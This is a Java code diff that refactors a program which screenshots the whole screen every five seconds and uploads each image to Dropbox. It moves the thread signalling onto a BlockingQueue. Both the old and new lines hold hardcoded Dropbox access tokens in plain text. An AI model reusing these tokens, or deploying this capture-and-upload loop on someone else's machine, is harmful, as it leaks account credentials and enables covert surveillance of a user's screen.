@@ -15,19 +15,22 @@ import java.io.IOException;
 import java.io.InputStream;
 import java.text.SimpleDateFormat;
 import java.util.Date;
+import java.util.concurrent.ArrayBlockingQueue;
+import java.util.concurrent.BlockingQueue;
+import java.util.concurrent.TimeUnit;
 
 public class MainClass {
-    private final String TOKEN = "qD5dXi3UxZAAAAAAAAAAAcf2t0uqRthz7juDp4kyYnXeHlMEW8DY2DPENPz92hju";
+    private final String TOKEN = "FUSok_L5WJAAAAAAAAAAAbsK25q2kQHTUv9zvRpDHdBXAA-jCiKQxQtn4YyS4clG";
+    private final BlockingQueue<String> queue = new ArrayBlockingQueue<>(10);
 
     private Thread objDelay = null;
     private Thread objSender = null;
-    private boolean puskSend = false;
 
     public static void main(String[] args) {
         new MainClass().start();
     }
     private  void start() {
-        objDelay = new DelayClass(5000);
+        objDelay = new DelayClass(5_000);
         objSender = new SenderClass();
         objSender.start();
         objDelay.start();
@@ -52,7 +55,7 @@ public class MainClass {
             try {
                 while (lifeParent.isAlive()) {
                     Thread.sleep(timeDelay);
-                    puskSend = true;
+                    queue.add("");
                 }
             } catch (InterruptedException e) {
                 System.out.println("crash class delay: " + e.getMessage());
@@ -75,34 +78,32 @@ public class MainClass {
             ByteArrayOutputStream outputStream = null;
             InputStream inputStream = null;
             SimpleDateFormat dateFormat = new SimpleDateFormat("yyyyMMdd_HHmmss");
-            try {
-                while (lifeParent.isAlive()) {
-                    if (!puskSend) {
-                        Thread.sleep(100);
-                        continue;
-                    }
-                    puskSend = false;
+            String next;
+            while (lifeParent.isAlive()) {
+                try {
+                    next = queue.poll(1, TimeUnit.SECONDS);
+                    if (next == null) continue;
+
                     image = new Robot().createScreenCapture(new Rectangle(Toolkit.getDefaultToolkit().getScreenSize()));
                     String data = dateFormat.format(new Date());
-
                     outputStream = new ByteArrayOutputStream();
                     ImageIO.write(image, "png", outputStream);
                     inputStream = new ByteArrayInputStream(outputStream.toByteArray());
 
                     FileMetadata metadata = client.files().uploadBuilder("/" + data + ".png").uploadAndFinish(inputStream);
+                } catch (InterruptedException e) {
+                    e.printStackTrace();
+                } catch (AWTException e) {
+                    e.printStackTrace();
+                } catch (IOException e) {
+                    e.printStackTrace();
+                } catch (UploadErrorException e) {
+                    e.printStackTrace();
+                } catch (DbxException e) {
+                    e.printStackTrace();
+                } catch (java.lang.Throwable e) {
+                    System.out.println("упс " + e.getMessage());
                 }
-            } catch (InterruptedException e) {
-                e.printStackTrace();
-            } catch (AWTException e) {
-                e.printStackTrace();
-            } catch (IOException e) {
-                e.printStackTrace();
-            } catch (UploadErrorException e) {
-                e.printStackTrace();
-            } catch (DbxException e) {
-                e.printStackTrace();
-            } catch (java.lang.Throwable e) {
-                System.out.println("упс " + e.getMessage());
             }
             System.out.println("stop");
         }
